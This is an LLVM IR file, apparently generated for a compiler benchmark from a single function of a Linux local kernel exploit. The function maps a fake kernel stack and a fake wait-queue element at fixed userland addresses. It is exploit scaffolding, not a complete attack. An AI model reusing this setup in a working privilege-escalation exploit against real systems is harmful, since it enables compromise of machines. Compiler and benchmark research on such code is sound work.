; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45553.c_allocate_uland_structs.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_45553.c_allocate_uland_structs.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.wait_queue = type { i32 }

@.str = private unnamed_addr constant [53 x i8] c"[-] failed to allocate structures at fixed location\0A\00", align 1
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_LOCKED = common dso_local global i32 0, align 4
@MAP_POPULATE = common dso_local global i32 0, align 4
@g_fake_stack = common dso_local global i8* null, align 8
@MAP_FAILED = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [9 x i8] c"[-] mmap\00", align 1
@g_uland_wq_elt = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [36 x i8] c"[+] userland structures allocated:\0A\00", align 1
@.str.3 = private unnamed_addr constant [25 x i8] c"[+] g_uland_wq_elt = %p\0A\00", align 1
@.str.4 = private unnamed_addr constant [25 x i8] c"[+] g_fake_stack   = %p\0A\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 ()* @allocate_uland_structs to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @allocate_uland_structs() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* inttoptr (i64 536870912 to i8*), i8** %2, align 8
  store i64 10, i64* %3, align 8
  br label %4

4:                                                ; preds = %63, %54, %31, %0
  %5 = load i64, i64* %3, align 8
  %6 = add i64 %5, -1
  store i64 %6, i64* %3, align 8
  %7 = icmp ule i64 %5, 0
  br i1 %7, label %8, label %10

8:                                                ; preds = %4
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %74

10:                                               ; preds = %4
  %11 = load i8*, i8** %2, align 8
  %12 = getelementptr i8, i8* %11, i64 4096
  store i8* %12, i8** %2, align 8
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* @PROT_READ, align 4
  %15 = load i32, i32* @PROT_WRITE, align 4
  %16 = or i32 %14, %15
  %17 = load i32, i32* @MAP_FIXED, align 4
  %18 = load i32, i32* @MAP_SHARED, align 4
  %19 = or i32 %17, %18
  %20 = load i32, i32* @MAP_ANONYMOUS, align 4
  %21 = or i32 %19, %20
  %22 = load i32, i32* @MAP_LOCKED, align 4
  %23 = or i32 %21, %22
  %24 = load i32, i32* @MAP_POPULATE, align 4
  %25 = or i32 %23, %24
  %26 = call i64 @_mmap(i8* %13, i32 4096, i32 %16, i32 %25, i32 -1, i32 0)
  %27 = inttoptr i64 %26 to i8*
  store i8* %27, i8** @g_fake_stack, align 8
  %28 = load i8*, i8** @g_fake_stack, align 8
  %29 = load i8*, i8** @MAP_FAILED, align 8
  %30 = icmp eq i8* %28, %29
  br i1 %30, label %31, label %33

31:                                               ; preds = %10
  %32 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  br label %4

33:                                               ; preds = %10
  %34 = load i8*, i8** @g_fake_stack, align 8
  %35 = getelementptr i8, i8* %34, i64 4294967296
  %36 = load i32, i32* @PROT_READ, align 4
  %37 = load i32, i32* @PROT_WRITE, align 4
  %38 = or i32 %36, %37
  %39 = load i32, i32* @MAP_FIXED, align 4
  %40 = load i32, i32* @MAP_SHARED, align 4
  %41 = or i32 %39, %40
  %42 = load i32, i32* @MAP_ANONYMOUS, align 4
  %43 = or i32 %41, %42
  %44 = load i32, i32* @MAP_LOCKED, align 4
  %45 = or i32 %43, %44
  %46 = load i32, i32* @MAP_POPULATE, align 4
  %47 = or i32 %45, %46
  %48 = call i64 @_mmap(i8* %35, i32 4096, i32 %38, i32 %47, i32 -1, i32 0)
  %49 = inttoptr i64 %48 to %struct.wait_queue*
  %50 = bitcast %struct.wait_queue* %49 to i8*
  store i8* %50, i8** @g_uland_wq_elt, align 8
  %51 = load i8*, i8** @g_uland_wq_elt, align 8
  %52 = load i8*, i8** @MAP_FAILED, align 8
  %53 = icmp eq i8* %51, %52
  br i1 %53, label %54, label %58

54:                                               ; preds = %33
  %55 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  %56 = load i8*, i8** @g_fake_stack, align 8
  %57 = call i32 @munmap(i8* %56, i32 4096)
  br label %4

58:                                               ; preds = %33
  %59 = load i8*, i8** @g_uland_wq_elt, align 8
  %60 = load i8*, i8** @g_fake_stack, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 4294967296
  %62 = icmp ne i8* %59, %61
  br i1 %62, label %63, label %68

63:                                               ; preds = %58
  %64 = load i8*, i8** @g_fake_stack, align 8
  %65 = call i32 @munmap(i8* %64, i32 4096)
  %66 = load i8*, i8** @g_uland_wq_elt, align 8
  %67 = call i32 @munmap(i8* %66, i32 4096)
  br label %4

68:                                               ; preds = %58
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0))
  %70 = load i8*, i8** @g_uland_wq_elt, align 8
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0), i8* %70)
  %72 = load i8*, i8** @g_fake_stack, align 8
  %73 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.4, i64 0, i64 0), i8* %72)
  store i32 0, i32* %1, align 4
  br label %74

74:                                               ; preds = %68, %8
  %75 = load i32, i32* %1, align 4
  ret i32 %75
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @_mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @munmap(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
